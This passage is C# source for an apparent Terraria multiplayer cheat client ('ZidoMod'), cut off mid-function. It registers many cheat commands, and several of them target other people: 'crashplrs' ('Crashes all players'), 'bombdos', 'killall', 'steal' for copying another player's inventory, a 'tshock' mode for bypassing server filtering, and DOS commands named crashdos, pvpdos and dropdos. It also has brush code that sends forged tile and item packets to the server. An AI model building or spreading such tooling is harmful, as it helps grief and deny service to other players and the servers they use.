using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Xna.Framework;
using System.IO;

namespace Terraria
{
    public delegate void ZidoDelegate(string[] args, int length, string full);
    public class ZidoCommand
    {
        public List<string> Names;
        public ZidoDelegate Command;

        public ZidoCommand(ZidoDelegate cmd, params string[] names)
        {
            if (names == null || names.Length < 1)
                throw new NotSupportedException();
            Command = cmd;
            Names = new List<string>(names);
        }

        public bool Run(string[] args, int length, string full)
        {
            try
            {
                Command(args, length, full);
            }
            catch (Exception e)
            {
                Main.NewText("Error in command! " + e,240,20,20);
                //print error somewhere?
            }
            return true;
        }

    }
    class ZidoMod
    {
        public static List<string> helptxt = new List<string> {
                                                                "save - Saves your current loadout of ZidoMod settings",
                                                                "bind - Bind a key to a command (place '-' infront of Zido commands)",
                                                                "unbind - Unbind a key",
                                                                "wipe - Reset all commands to default",
                                                                "bombdos - Create an explosion at every player (inc. npc's), VERY dangerous",
                                                                "tshock , usealt - Use on tshock servers to bypass some filtering.", 
                                                                "ui , gui - toggle display of active features",
                                                                "fullbright , brightness , fb - Everything is bright",
                                                                "fbcolor - Change the color of fullbright",
                                                                "move - moves you up/down/left/right by 'var' feet (-move [up/down/left/right] [var])",
                                                                "warp - warps to a saved warp position (-warp [warp name])",
                                                                "setwarp - sets a warp at your position (-setwarp [warp name])",
                                                                "delwarp - deletes a warp position (-delwarp [warp name])",
                                                                "wipewarps - deletes all warps store for this server",
                                                                "loadwarps - loads warps for this",
                                                                "noclip , nc - Move anywhere you want",
                                                                "accurate , accurateplayers - Show player at accurate co-ords",
                                                                "freecam , outofbody - Move camera instead of player",
                                                                "god , g - Take no damage and loose no breath",
                                                                "undead , nodie , nodeath - Hit 0 health, don't die.",
                                                                "infmana ,infinitemana - Infinite mana.",
                                                                "range , itemrange , hitrange , tilerange - Toggle and set the range at which you can place blocks",
                                                                "pickup , pickuprange - Toggle and set range at which you can pick up items",
                                                                "track , tracking - See location of monsters",
                                                                "radar , showradar - Toggle the radar",
                                                                "showinvis , noinvis - Show invisible players",
                                                                "infrockets , infboots , infwings - Infinite rocket boosting, or wings.",
                                                                "slowfall - Toggle slowfall",
                                                                "waterwalk , lavawalk - Toggle walking on liquids",
                                                                "infbreath , breath - Never run out of breath",
                                                                "thorns - Enemies take damage when they hit you",
                                                                "gravctrl , grav , gravity - Toggle gravity control",
                                                                "knockback , noknockback - Toggle wether you recieve knockback",
                                                                "speed , speedhack , sh - Toggle and set speed hack",
                                                                "reuse , autoreuse - Automatically reswing/cast/etc weapon or item.",
                                                                "infammo - Infinate ammo",
                                                                "infjump - Infinite extra jumps",
                                                                "fastuse , usespeed , rapidfire - toggle and set rapid use of items or weapons",
                                                                "noanimate - Toggle character use animations",
                                                                "noprojectile - Stops client from sending projectiles",
                                                                "capstats , fakehealth",
                                                                "maxstack , infstack - Infinite items.",
                                                                "gps , pos - Toggles GPS accessory buff",
                                                                "light , flashlight - A light that follows your cursor",
                                                                "flashcolor - can set colour of flashlight (-flashcolor [R] [G] [B]",
                                                                "nodebuff , disabledebuff - No debuffs from enemies",
                                                                "allowdelbuff - Can right click remove debuffs, On by default.",
                                                                "maxrespawn fullrespawn - Always respawn with full health",
                                                                "instantspawn , instantrespawn - No respawn timer after death",
                                                                "nofall , nofalldmg - Toggle falling damage",
                                                                "showrecipes - Toggle show all recipies",
                                                                "uberdef , uberdefense - Extreme defense",
                                                                "superjump , sjump , jump - Toggle super jump",
                                                                "fastmouse , mouserelease - Can click and hold to keep drawing",
                                                                "freecrafting - Toggle craft any item without need for resources",
                                                                "invis , invisible - Toggle yourself invisable",
                                                                "usetime - How fast an item shoots/uses, lower is faster.",
                                                                "shoot - Set the projectile an item shoots",
                                                                "ammo - What ammo the item uses (does not shoot it)",
                                                                "shootspeed - Speed of shot projectile",
                                                                "damage - Damage of weapon/projectile",
                                                                "pick , hammer , axe - Set the tool power % for any item",
                                                                "say - Send a normal message, can send - as the first char",
                                                                "camfollow , watch - Your screen will follow a player",
                                                                "stalk , follow - Your character will follow a player",
                                                                "camto - Moves camera to a player, with freecam",
                                                                "tile , placetile - Place any tile with clicks",
                                                                "wall , placewall - Place any wall with clicks",
                                                                "liquid , placeliquid - Place liquids with clicks",
                                                                "projectile - Draws a projectile",
                                                                "drop - Draws an item",
                                                                "tpmouse , mousetp - Your player will follow mouse",
                                                                "resetmouse , mousereset - Reset any mouse mode you may have on (drawing)",
                                                                "removetile - Delete tiles with clicks",
                                                                "removewall - Delete walls with clicks",
                                                                "removeliquid - Removes liquids with clicks",
                                                                "spawn , respawn - Spawns you as if you died",
                                                                "tp , teleport - Teleport to a player",
                                                                "clear - Clears inventory and saves it, use -recover to bring it back",
                                                                "recover - Bring back an inventory you used -clear with",
                                                                "killme - Kills you... Text after the command is the death message",
                                                                "kill - Kills a player...",
                                                                "killall , killplrs , killplayers - Kills everyone on the server...",
                                                                "bombplayers , bombplrs - Single use of -bombdos, very dangerous",
                                                                "killmobs - Kill non-friendly NPC's",
                                                                "killnpcs - Kill friendly NPC's",
                                                                "backup - Backup invenntory (not persistant, use restore before closing terraria)",
                                                                "restore - Restores the backed up inventory",
                                                                "fullstack - Fills all the items in your inventory to max",
                                                                "itemprefix - Spawn an item with a specific prefix",
                                                                "item - Spawn an item",
                                                                "chest - Switches to another chest if you have one open",
                                                                "home - Go to your home point that was set with -sethome",
                                                                "sethome - Set home point, go back with -home",
                                                                "steal - Copies a player's inventory into yours, may want to -backup first",
                                                                "healplrs , healplayers , healall - Heal everyone",
                                                                "manaplrs , manaplayers , manaall - Give mana to everyone",
                                                                "heal - Heal yourself",
                                                                "give - Give an item to a player",
                                                                "setstats - Set health and mana",
                                                                "repeat - Repeat the last command",
                                                                "crashplrs , crashall - Crashes all players"
                                                            };
        public static List<ZidoCommand> commands = new List<ZidoCommand>();
        public static List<string> chathist = new List<string> { }; //BlueFly
        public static bool showFps = true; //BlueFly
        public static List<string> bindings = new List<string> { }; //BlueFly
        public static List<string> bindkeys = new List<string> { }; //BlueFly
        public static List<string> warpnames = new List<string> { }; //BlueFly
        public static List<Vector2> warpcords = new List<Vector2> { };//BlueFly
        public static bool cmdLimit = false; //BlueFly
        public static bool fullbright = false; //Doneski
        public static Color fullbrightcolor = Color.White;//cracker64
        public static bool noClip = false; //Doneski
        public static bool accuratePlayers = false; //Doneski
        public static bool freeCam = false; //Doneski
        public static bool godMode = false; //Doneski
        public static bool undead = false; //Doneski
        public static bool infiniteMana = false; //Doneski
        public static int tileRange = 4; //Doneski
        public static bool tracking = false; //Doneski
        public static bool infiniteRockets = false; //Doneski
        public static bool slowFall = false; //Doneski
        public static bool waterWalk = false; //Doneski
        public static bool infiniteBreath = false; //Doneski
        public static bool thorns = false; //Doneski
        public static bool gravityControl = false; //Doneski
        public static bool noKnockback = false; //Doneski
        public static float speedHack = 1f; //Doneski
        public static bool autoReuse = false; //Doneski
        public static bool infiniteStack = false; //Doneski
        public static bool infiniteJump = false; //Doneski
        public static int fastUse = 1; //Doneski
        public static bool noAnimateSend = false; //Doneski
        public static bool noProjectileSend = false; //Doneski
        public static bool noMovementSend = false;
        public static bool capNetStats = false; //Doneski
        public static bool forceMaxStack = false; //Doneski
        public static bool GPSDisplay = true; //Doneski
        public static bool flashlight = false; //Doneski
        public static Color flashlightcolor = Color.FromNonPremultiplied(10, 10, 10, 10);//BlueFly
        public static bool showAllRecipes = false; //Doneski
        public static bool freeCrafting = false; //Doneski
        public static bool disableDebuffs = false; //Doneski
        public static bool allowRemoveDebuffs = true; //Doneski
        public static int pickupRange = 38; //Doneski
        public static bool instantRespawn = false; //Doneski
        public static bool maxRespawn = false; //Doneski
        public static bool invisible = false; //Doneski
        public static bool showUI = true; //Doneski
        public static bool showRadar = true; //Doneski
        public static bool superJump = false; //Doneski
        public static bool uberDefense = false; //Doneski
        public static bool bypassNetMode = false; //Doneski
        public static bool useAlternativeSendData = false; //Doneski
        public static bool noFallDmg = false; //Doneski
        public static bool showInvis = false; //Doneski
        public static bool bombDOS = false;
        public static bool debuffDOS = false;
        public static bool npcDOS = false; //Implement me!
        public static bool pvpDOS = false; //Implement me!
        public static bool dropDOS = false; //Implement me!
        public static bool crashDOS = false;

        public static int mouseMode = 0;
        public static bool mouseReleaseNeeded = true;
        public static int brushType = 0;
        public static int brushSize = 0;
        public static int brushExtra = 0;

        public static int followMode = 0;
        public static int followTarget = 0;
        public static Item[] invisArmor = new Item[11];
        public static Item[] backupInventory = new Item[49];
        public static Item[] backupArmor = new Item[11];
        public static Item[] recoveryInventory = new Item[49];
        public static Item[] recoveryArmor = new Item[11];
        public static Vector2 homeLoc = new Vector2(0, 0);
        public static string lastCommand;

        public static void nosplash()
        {
            Main.showSplash = false;
        }

        public static Color GetStatusColor(bool test)
        {
            return new Color(Main.mouseTextColor, Main.mouseTextColor, Main.mouseTextColor, Main.mouseTextColor);
        }

        public static int GetPlayer(string player)
        {
            player = player.ToLower().Trim();
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].name.ToLower() == player || player == "-" && string.IsNullOrWhiteSpace(Main.player[i].name))
                {
                    return i;
                }
            }
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].name.ToLower().Contains(player))
                {
                    return i;
                }
            }
            return -1;
        }

        public static void OnLeftClick(bool release)
        {
            int tileTargetX = (int)(((float)Main.mouseX + Main.screenPosition.X) / 16f);
            int tileTargetY = (int)(((float)Main.mouseY + Main.screenPosition.Y) / 16f);
            int TargetX = (int)((float)Main.mouseX + Main.screenPosition.X);
            int TargetY = (int)((float)Main.mouseY + Main.screenPosition.Y);

            if (mouseReleaseNeeded && !release)
                return;

            if (mouseMode == 1)
            {
                int index = Projectile.NewProjectile(TargetX, TargetY, -brushSize, 0, brushType, 999999, 0.0f, 0xff);
                if (Main.netMode == 1)
                {
                    NetMessage.SendData(0x1b, -1, -1, "", index, 0f, 0f, 0f, 0);
                }
            }
            else if (mouseMode == 2)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.PlaceTile(tx, ty, brushType, true, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 1, tx, ty, brushType, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 3)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.PlaceWall(tx, ty, brushType, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 3, tx, ty, brushType, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 4)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        Main.tile[tx, ty].liquid = (byte)brushExtra;
                        Main.tile[tx, ty].lava = (brushType == 1 ? true : false);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.sendWater(tx, ty);
                            else
                            {
                                bypassNetMode = true;
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                                bypassNetMode = false;
                            }
                        }
                    }
                }
            }
            else if (mouseMode == 5)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.KillTile(tx, ty, false, false, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 4, tx, ty, 0, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 6)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.KillWall(tx, ty);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 2, tx, ty, 0, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 7)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        Main.tile[tx, ty].liquid = 0;
                        Main.tile[tx, ty].lava = false;
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.sendWater(tx, ty);
                            else
                            {
                                bypassNetMode = true;
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                                bypassNetMode = false;
                            }
                        }
                    }
                }
            }
            else if (mouseMode == 8)
            {
                int index5 = Item.NewItem(TargetX, TargetY, Main.player[Main.myPlayer].width, Main.player[Main.myPlayer].height, brushType, brushSize, false, 0);
                if (Main.netMode == 1)
                {
                    NetMessage.SendData(21, -1, -1, "", index5, 0f, 0f, 0f, 0);
                }
            }
            else if (mouseMode == 9)
            {
                Main.player[Main.myPlayer].position = new Vector2(TargetX, TargetY);
            }
            return;
        }

        public static void OnRightClick(bool release)
        {
            int tileTargetX = (int)(((float)Main.mouseX + Main.screenPosition.X) / 16f);
            int tileTargetY = (int)(((float)Main.mouseY + Main.screenPosition.Y) / 16f);
            int TargetX = (int)((float)Main.mouseX + Main.screenPosition.X);
            int TargetY = (int)((float)Main.mouseY + Main.screenPosition.Y);

            if (mouseReleaseNeeded && !release)
                return;

            if (mouseMode == 1)
            {
                int index = Projectile.NewProjectile(TargetX, TargetY, brushSize, 0, brushType, 999999, 0.0f, 0xff);
                if (Main.netMode == 1)
                {
                    NetMessage.SendData(0x1b, -1, -1, "", index, 0f, 0f, 0f, 0);
                }
            }
            else if (mouseMode == 2)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.PlaceTile(tx, ty, brushType, true, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 1, tx, ty, brushType, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 3)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.PlaceWall(tx, ty, brushType, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 3, tx, ty, brushType, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 4)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        Main.tile[tx, ty].liquid = (byte)brushExtra;
                        Main.tile[tx, ty].lava = (brushType == 1 ? true : false);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.sendWater(tx, ty);
                            else
                            {
                                bypassNetMode = true;
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                                bypassNetMode = false;
                            }
                        }
                    }
                }
            }
            else if (mouseMode == 5)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.KillTile(tx, ty, false, false, true);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 4, tx, ty, 0, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 6)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        WorldGen.KillWall(tx, ty);
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.SendData(0x11, -1, -1, "", 2, tx, ty, 0, 0);
                            else
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                        }
                    }
                }
            }
            else if (mouseMode == 7)
            {
                for (int x = -brushSize; x <= brushSize; x++)
                {
                    for (int y = -brushSize; y <= brushSize; y++)
                    {
                        int tx = tileTargetX + x;
                        int ty = tileTargetY + y;
                        Main.tile[tx, ty].liquid = 0;
                        Main.tile[tx, ty].lava = false;
                        if (Main.netMode == 1)
                        {
                            if (useAlternativeSendData)
                                NetMessage.sendWater(tx, ty);
                            else
                            {
                                bypassNetMode = true;
                                NetMessage.SendTileSquare(-1, tx, ty, 1);
                                bypassNetMode = false;
                            }
                        }
                    }
                }
            }
            else if (mouseMode == 8)
            {
                int index5 = Item.NewItem(TargetX, TargetY, Main.player[Main.myPlayer].width, Main.player[Main.myPlayer].height, brushType, brushSize, false, 0);
                if (Main.netMode == 1)
                {
                    NetMessage.SendData(21, -1, -1, "", index5, 0f, 0f, 0f, 0);
                }
            }
            else if (mouseMode == 9)
            {
                Main.player[Main.myPlayer].position = new Vector2(TargetX, TargetY);
            }
            return;
        }

        public static bool pages(List<string> lst, string prefix, string pg, byte r, byte g, byte b)
        {
            if (lst.Count < 1)
            {
                Main.NewText("No " + prefix + " found.", 255, 20, 20);
                return true;
            }
            int page = 0;
            bool isInt = int.TryParse(pg, out page);
            if (!isInt)
            {
                page = 0;
            }
            else
            {
                page -= 1;
            }
            if (page < 0) page = 0;
            int start = page * 5;
            if (start > lst.Count - 1)
            {
                start = 0;
                page = 0;
            }
            int plus = lst.Count - start;
            if (plus > 5) plus = 5;
            int i = 0;
            Main.NewText(prefix + " [Page " + (page + 1) + " of " + ((int)Math.Ceiling(lst.Count / 5.0)) + "]", r, g, b);
            do
            {
                Main.NewText(lst[start + i], 255, 240, 20);
            }
            while (++i < plus);
            return true;
        }
        public static void initZidoCommands()
        {
            commands.Add(new ZidoCommand(TestCommand, "test"));
            commands.Add(new ZidoCommand(save, "save"));
            commands.Add(new ZidoCommand(bind, "bind"));
            commands.Add(new ZidoCommand(unbind, "unbind"));
            commands.Add(new ZidoCommand(wipe, "wipe"));
            commands.Add(new ZidoCommand(bombdos, "bombdos"));
            commands.Add(new ZidoCommand(usealt, "tshock","usealt"));
            commands.Add(new ZidoCommand(gui, "ui","gui"));
            commands.Add(new ZidoCommand(fullbrightness, "fullbright" , "brightness" , "fb"));
            commands.Add(new ZidoCommand(fbcolor, "fbcolor"));
            commands.Add(new ZidoCommand(move, "move"));
            commands.Add(new ZidoCommand(warp, "warp"));
            commands.Add(new ZidoCommand(setwarp, "setwarp"));
            commands.Add(new ZidoCommand(delwarp, "delwarp"));
            commands.Add(new ZidoCommand(wipewarps, "wipewarps"));
            commands.Add(new ZidoCommand(loadwarps, "loadwarps"));
            commands.Add(new ZidoCommand(showfps, "showfps"));
            commands.Add(new ZidoCommand(noclip, "noclip" , "nc"));
            commands.Add(new ZidoCommand(accurateplayers, "accurate","accurateplayers"));
            commands.Add(new ZidoCommand(freecam, "freecam","outofbody"));
            commands.Add(new ZidoCommand(god, "god","g"));
            commands.Add(new ZidoCommand(nodeath, "undead","nodie","nodeath"));
            commands.Add(new ZidoCommand(infmana, "infmana","infinitemana"));
            commands.Add(new ZidoCommand(range, "range","itemrange","hitrange","tilerange"));
            commands.Add(new ZidoCommand(pickuprange, "pickup","pickuprange"));
            commands.Add(new ZidoCommand(track, "track","tracking"));
            commands.Add(new ZidoCommand(radar, "radar","showradar"));
            commands.Add(new ZidoCommand(showinvis, "showinvis","noinvis"));
            commands.Add(new ZidoCommand(infrockets, "infrockets","infboots","infwings"));
            commands.Add(new ZidoCommand(slowfall, "slowfall"));
            commands.Add(new ZidoCommand(waterwalk, "waterwalk","lavawalk"));
            commands.Add(new ZidoCommand(infbreath, "infbreath","breath"));
            commands.Add(new ZidoCommand(thornbuff, "thorns"));
            commands.Add(new ZidoCommand(grav, "gravctrl","grav","gravity"));
            commands.Add(new ZidoCommand(knockback, "knockback","noknockback"));
            commands.Add(new ZidoCommand(speed, "speed","speedhack","sh"));
            commands.Add(new ZidoCommand(reuse, "reuse","autoreuse"));
            commands.Add(new ZidoCommand(infammo, "infammo"));
            commands.Add(new ZidoCommand(infjump, "infjump"));
            commands.Add(new ZidoCommand(fastuse, "fastuse","usespeed","rapidfire"));
            commands.Add(new ZidoCommand(noanimate, "noanimate"));
            commands.Add(new ZidoCommand(noprojectile, "noprojectile"));
            commands.Add(new ZidoCommand(capstats, "capstats","fakehealth"));
            commands.Add(new ZidoCommand(infstack, "maxstack","infstack"));
            commands.Add(new ZidoCommand(gps, "gps","pos"));
            commands.Add(new ZidoCommand(light, "light","flashlight"));
            commands.Add(new ZidoCommand(flashcolor, "flashcolor"));
            commands.Add(new ZidoCommand(nodebuff, "nodebuff","disabledebuff"));
            commands.Add(new ZidoCommand(allowdelbuff, "allowdelbuff"));
            commands.Add(new ZidoCommand(maxrespawn, "maxrespawn"," fullrespawn"));
            commands.Add(new ZidoCommand(instantspawn, "instantspawn","instantrespawn"));
            commands.Add(new ZidoCommand(nofall, "nofall","nofalldmg"));
            commands.Add(new ZidoCommand(showrecipes, "showrecipes"));
            commands.Add(new ZidoCommand(uberdef, "uberdef","uberdefense"));
            commands.Add(new ZidoCommand(superjump, "superjump","sjump","jump"));
            commands.Add(new ZidoCommand(fastmouse, "fastmouse","mouserelease"));
            commands.Add(new ZidoCommand(freecrafting, "freecrafting"));
            commands.Add(new ZidoCommand(invis, "invis","invisible"));
            commands.Add(new ZidoCommand(usetime, "usetime"));
            commands.Add(new ZidoCommand(shoot, "shoot"));
            commands.Add(new ZidoCommand(ammo, "ammo"));
            commands.Add(new ZidoCommand(shootspeed, "shootspeed"));
            commands.Add(new ZidoCommand(damage, "damage"));
            commands.Add(new ZidoCommand(pick, "pick"));
            commands.Add(new ZidoCommand(hammer, "hammer"));
            commands.Add(new ZidoCommand(axe, "axe"));
            commands.Add(new ZidoCommand(say, "say"));
            commands.Add(new ZidoCommand(watch, "camfollow","watch"));
            commands.Add(new ZidoCommand(stalk, "stalk","follow"));
            commands.Add(new ZidoCommand(camto, "camto"));
            commands.Add(new ZidoCommand(placetile, "tile","placetile"));
            commands.Add(new ZidoCommand(placewall, "wall","placewall"));
            commands.Add(new ZidoCommand(placeliquid, "liquid","placeliquid"));
            commands.Add(new ZidoCommand(drawprojectile, "projectile"));
            commands.Add(new ZidoCommand(drawitems, "drop"));
            commands.Add(new ZidoCommand(tpmouse, "tpmouse","mousetp"));
            commands.Add(new ZidoCommand(resetmouse, "resetmouse","mousereset"));
            commands.Add(new ZidoCommand(removetile, "removetile"));
            commands.Add(new ZidoCommand(removewall, "removewall"));
            commands.Add(new ZidoCommand(removeliquid, "removeliquid"));
            commands.Add(new ZidoCommand(spawn, "spawn","respawn"));
            commands.Add(new ZidoCommand(tp, "tp","teleport"));
            commands.Add(new ZidoCommand(clear, "clear"));
            commands.Add(new ZidoCommand(recover, "recover"));
            commands.Add(new ZidoCommand(killme, "killme"));
            commands.Add(new ZidoCommand(kill, "kill"));
            commands.Add(new ZidoCommand(killall, "killall","killplrs","killplayers"));
            commands.Add(new ZidoCommand(bombplrs, "bombplayers","bombplrs"));
            commands.Add(new ZidoCommand(killmobs, "killmobs"));
            commands.Add(new ZidoCommand(killnpcs, "killnpcs"));
            commands.Add(new ZidoCommand(backup, "backup"));
            commands.Add(new ZidoCommand(restore, "restore"));
            commands.Add(new ZidoCommand(fullstack, "fullstack"));
            commands.Add(new ZidoCommand(itemprefix, "itemprefix"));
            commands.Add(new ZidoCommand(item, "item"));
            commands.Add(new ZidoCommand(chest, "chest"));
            commands.Add(new ZidoCommand(home, "home"));
            commands.Add(new ZidoCommand(sethome, "sethome"));
            commands.Add(new ZidoCommand(steal, "steal"));
            commands.Add(new ZidoCommand(healplrs, "healplrs","healplayers","healall"));
            commands.Add(new ZidoCommand(manaplrs, "manaplrs","manaplayers","manaall"));
            commands.Add(new ZidoCommand(heal, "heal"));
            commands.Add(new ZidoCommand(give, "give"));
            commands.Add(new ZidoCommand(setstats, "setstats"));
            commands.Add(new ZidoCommand(repeat, "repeat"));
            commands.Add(new ZidoCommand(skeletron, "skeletron"));
            commands.Add(new ZidoCommand(crashplrs, "crashplrs","crashall"));
            commands.Add(new ZidoCommand(fireplrs, "fireplrs"));
            commands.Add(new ZidoCommand(disableplrs, "disableplrs"));
            commands.Add(new ZidoCommand(bombdos, "bombdos"));
            commands.Add(new ZidoCommand(crashdos, "crashdos"));
            commands.Add(new ZidoCommand(npcdos, "npcdos"));
            commands.Add(new ZidoCommand(pvpdos, "pvpdos"));
            commands.Add(new ZidoCommand(debuffdos, "debuffdos"));
            commands.Add(new ZidoCommand(dropdos, "dropdos"));
            commands.Add(new ZidoCommand(requestsigns, "requestsigns"));
            commands.Add(new ZidoCommand(wrecksigns, "wrecksigns"));
        }

        public static void TestCommand(string[] args, int length, string full)
        {
            Main.NewText("test command works", 240, 240, 20);
        }

        public static bool OnCommand(string cmd, string[] args, int length, string full)
        {
            try
            {
                ZidoCommand command = commands.FirstOrDefault(c => c.Names.Contains(cmd));
                if (command != null)
                    if (command.Run(args, length, full))
                        return true;
                switch (cmd)
                {
                    //can still do old commands here for a quick test

                    default:
                        return false;
                }
            }
            catch (Exception exception)
            {
                Main.NewText("Command Error: " + exception, 255, 20, 20);
                return false;
            }
        }


        public static void save(string[] args, int length, string full)
        {
            Main.NewText("Saving Settings ...", 255, 240, 20);
            Main.SaveZidoSettings();
        }

        public static void move(string[] args, int length, string full)
        {
            if (length < 3)
            {
                Main.NewText("No number given (-goup [up/down/left/right] [distance in feet]).", 255, 20, 20);
                return;
            }
            float move = -1;
            float.TryParse(args[2], out move);
            if (move >= 0)
            {
                string dir = args[1].ToLower();
                move *= 8;
                switch (dir)
                {
                    case "up":
                        Main.player[Main.myPlayer].position.Y -= move;
                        Main.NewText("Teleported " + dir + " " + args[2] + " feet.", 255, 240, 20);
                        return;
                    case "down":
                        Main.player[Main.myPlayer].position.Y += move;
                        Main.NewText("Teleported " + dir + " " + args[2] + " feet.", 255, 240, 20);
                        return;
                    case "left":
                        Main.player[Main.myPlayer].position.X -= move;
                        Main.NewText("Teleported " + dir + " " + args[2] + " feet.", 255, 240, 20);
                        return;
                    case "right":
                        Main.player[Main.myPlayer].position.X += move;
                        Main.NewText("Teleported " + dir + " " + args[2] + " feet.", 255, 240, 20);
                        return;
                    default:
                        Main.NewText("No direction given, please use (up/down/left/right)", 255, 20, 20);
                        return;
                }
            }


        }

        public static void warp(string[] args, int length, string full)
        {
            if (length < 2)
            {
                Main.NewText("No warp name specified (-warp [warp name]).", 255, 20, 20);
                return;
            }
            string warpname = full.ToLower();
            warpname = warpname.Substring(warpname.IndexOf(" ") + 1);
            if (warpnames.Contains(warpname))
            {
                int warpindex = warpnames.IndexOf(warpname);
                Main.player[Main.myPlayer].position = warpcords[warpindex];
                Main.NewText("Warped to " + warpname, 255, 240, 20);
            }
            else
            {
                Main.NewText("No such warp.", 255, 20, 20);
            }
        }

        public static void setwarp(string[] args, int length, string full)
        {
            if (length < 2)
            {
                Main.NewText("No warp name specified (-setwarp [warp name]).", 255, 20, 20);
                return;
            }
            string warpnameset = full.ToLower();
            warpnameset = warpnameset.Substring(warpnameset.IndexOf(" ") + 1);
            if (warpnames.Contains(warpnameset))
            {
                Main.NewText("Warp name already in use.", 255, 20, 20);
                return;
            }
            warpnames.Add(warpnameset);
            Vector2 playerpos = Main.player[Main.myPlayer].position;
            warpcords.Add(playerpos);
            Main.NewText("Warp '" + warpnameset + "' set at '" + playerpos.X + "," + playerpos.Y + "'.", 255, 240, 20);
            Main.saveWarps();
        }

        public static void delwarp(string[] args, int length, string full)
        {
            if (length < 2)
            {
                Main.NewText("No warp name specified (-delwarp [warp name]).", 255, 20, 20);
                return;
            }
            string warpnamedel = full.ToLower();
            warpnamedel = warpnamedel.Substring(warpnamedel.IndexOf(" ") + 1);
            if (warpnames.Contains(warpnamedel))
            {
                int warpindex = warpnames.IndexOf(warpnamedel);
                warpnames.RemoveAt(warpindex);
                warpcords.RemoveAt(warpindex);
                Main.NewText("Warp " + warpnamedel + " deleted.", 255, 240, 20);
                Main.saveWarps();
            }
            else
            {
                Main.NewText("No such warp.", 255, 20, 20);
            }

        }

        public static void wipewarps(string[] args, int length, string full)
        {
            warpnames.Clear();
            warpcords.Clear();
            Main.NewText("All warps deleted.", 255, 240, 20);
            Main.saveWarps();
        }

        public static void warps(string[] args, int length, string full)
        {
            if (length > 2)
            {
                Main.NewText("Usage: -warps <page>", 255, 20, 20);
                return;
            }
            string num = "0";
            if (length == 2) num = args[1];
            if (!pages(warpnames, "Warps", num, 25, 240, 20))
            {
                Main.NewText("Invalid page.", 255, 20, 20);
            }
        }

        public static void loadwarps(string[] args, int length, string full)
        {
            Main.NewText("Loading warps...", 255, 240, 20);
            Main.loadWarps();
        }

        public static void showfps(string[] args, int length, string full)
        {
            showFps = !showFps;
        }

        public static void help(string[] args, int length, string full)
        {
            if (length > 2)
            {
